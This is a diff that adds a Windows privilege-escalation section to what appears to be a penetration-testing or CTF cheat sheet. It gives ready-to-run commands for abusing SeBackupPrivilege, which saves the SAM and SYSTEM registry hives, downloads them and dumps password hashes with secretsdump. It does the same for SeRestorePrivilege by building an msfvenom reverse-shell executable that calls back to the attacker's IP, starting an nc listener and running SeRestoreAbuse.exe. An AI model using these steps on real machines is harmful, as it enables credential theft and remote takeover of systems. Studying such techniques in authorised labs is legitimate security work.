@@ -101,3 +101,59 @@ winpeas ->
 wget https://github.com/peass-ng/PEASS-ng/releases/download/20250301-c97fb02a/winPEASany.exe -OutFile winPEASany.exe
 .\winPEASany.exe  # Run WinPEAS
 ```
+
+### 10. PRIVILEGES Exploitation, quick and easy
+
+<details>
+
+<summary>SeBackupPrivilege</summary>
+
+Let's say we got some sort of evil winrm session on our target:
+
+```
+mkdir C:\Temp
+cd C:\Temp
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\system C:\temp\system.hive
+download "C:/Temp/system.hive"
+download "C:/Temp/sam.hive"
+```
+
+and on our attackbox:
+
+```
+secretsdump -sam sam.hive -system system.hive LOCAL
+```
+
+</details>
+
+<details>
+
+<summary>SeRestorePrivilege</summary>
+
+We start off by making a malicious exe:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR tun0 IP> LPORT=80 -f exe -o reverse.exe
+```
+
+Then we downlaod SeRestoreAbuse.exe:
+
+```
+https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------
+```
+
+after we set up our listener:
+
+```
+rlwrap nc -nlvp 80
+```
+
+and launch our command:
+
+```
+.\SeRestoreAbuse.exe reverse.exe
+```
+
+</details>
+
